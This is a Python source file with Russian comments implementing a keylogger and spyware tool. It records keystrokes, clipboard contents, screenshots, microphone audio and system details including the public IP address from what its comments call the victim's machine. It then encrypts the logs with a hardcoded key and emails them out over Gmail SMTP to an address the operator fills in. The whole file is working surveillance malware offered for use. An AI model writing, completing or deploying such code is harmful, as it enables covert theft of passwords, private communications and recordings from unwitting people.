# Библиотеки 

# Библиотеки для отправления email
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Библиотеки для сбора информации об устройсте

import socket
import platform

# Библиотеки для получения информации из буфера обмена 

import win32clipboard 

# Библиотека для непосредственного логирования 

from pynput.keyboard import Key, Listener

import time
import os

# Библиотеки для снятия информации с микрофонов 

from scipy.io.wavfile import write
import sounddevice as sd 

# Библиотека для шифрования файлов
from cryptography.fernet import Fernet

import getpass 
from requests import get

# Библиотека для работы со скриншотами 

from multiprocessing import Process, freeze_support
from PIL import ImageGrab



# Имя файла и путь к файлу

keys_information = "keys_log.txt"
system_information = "systeminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information="screenshot.png"

keys_information_e ="e_keys_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"


microphone_time = 10


# Блок куда мы вписываем email, пароль и путь

email_address = " " #Написать сюда адрес отправки
password = " " # написать сюда пароль
toaddr = " " #Написать сюда адрес получения
username = getpass.getuser()

file_path = " "  # Путь, куда должны быть сохранены логи 
extend = "/"
file_merge= file_path + extend




# Ключ шифровки/дешифровки 
# Новый ключ можно сгенерировать с помощью программы GenerateKey.py

key = 'ZAb9ktsrcRTlbvMdLg2MUkLtC3ABtHgjuoJYMVnRMKQ='

# Функция для отправки сообщения 
def send_email(filename, attachment, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_Of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename =%s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls() 

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr,toaddr, text)

    s.quit()



# Получаем информацию о машине жертвы 

def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.pipfy.org").text
            f.write("Public IP Address:" + public_ip) 
        
        except Exception:
            f.write("Couldn't get Public IP adress (most likely max query)" + "\n")
        
        f.write("Processor: " + (platform.processor()) + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private ID Address: " + IPAddr + "\n")




# Функция для получения информации из буфера обмена 

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")



# Функция Микрофон

def microphone():
    # выставляем частоту 
    fs = 44100
    # выставляем сколько секунд должен записывать микрофон
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs , myrecording)



# Функция для получения скриншотов 

def screenshot() :
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_information)



# Кейлогер 
count = 0
keys = [] 

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count +=1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

# Функция при записи в файл убирает кавычки и разделяет между собой слова в
def write_file(keys):
    with open(file_path + extend + keys_information, "a" ) as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

    # Функция для прекращения записи через нажатие клавиши "ESC"
def on_release(key): 
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


send_email(keys_information, file_path + extend + keys_information, toaddr) 
screenshot()
send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
computer_information()
send_email(system_information, file_path + extend + system_information, toaddr)
copy_clipboard()  
microphone()

# Блок симетричного шифрования с использованием библиотеки Fernet

files_to_encrypt = [file_merge + system_information, file_merge+ clipboard_information, file_merge +  keys_information]

encrypted_file_names = [file_merge + system_information_e, file_merge+ clipboard_information_e, file_merge +  keys_information_e]

# цикл, обрабатывающий файлы из списка files_to_encrypt и шифрует их 

count= 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data= f.read()

    fernet=Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(10) 
